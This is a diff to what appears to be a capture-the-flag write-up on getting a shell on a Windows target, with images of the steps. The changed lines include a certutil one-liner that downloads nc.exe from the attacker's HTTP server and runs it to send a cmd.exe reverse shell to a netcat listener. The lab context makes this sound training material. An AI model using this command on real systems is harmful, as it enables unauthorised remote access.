@@ -41,10 +41,15 @@ Clicking on the link we get a web page that we can now treverse through the syst
 
 From here we then try to see if we can use our kali box to create esclated privilege.
 
+First we need to get a cmd terminal on the windows machine
+<img width="844" height="703" alt="touchcmd" src="https://github.com/user-attachments/assets/f7b4fb78-a6d6-4ff2-9cfa-0305baf56948" />
+
+
+
 on the attack box
 ```
 cd /tmp
-cp /usr/share/windows-resources/binaries/nc.exe
+cp /usr/share/windows-resources/binaries/nc.exe . 
 python3 -m http.server 1234
 ```
 
@@ -53,7 +58,7 @@ nc -lnvp 4444
 
 back on the box we run the following command
 ```
-certutil -urlcache -split -f http://{tun0_IP}:{PORT}/nc.exe n.exe && n.exe -e cmd.exe {tun0_IP} {PORT}
+certutil -urlcache -split -f http://{HTTP_SERVER_IP}:{PORT}/nc.exe n.exe && n.exe -e cmd.exe {LISTENER_IP} {PORT}
 ```
 poking around we find the backend folder and an interesting file with bytes being index.ts
 <img width="761" height="724" alt="image" src="https://github.com/user-attachments/assets/b0d1d61b-d42f-4182-9781-b0000efe6964" />
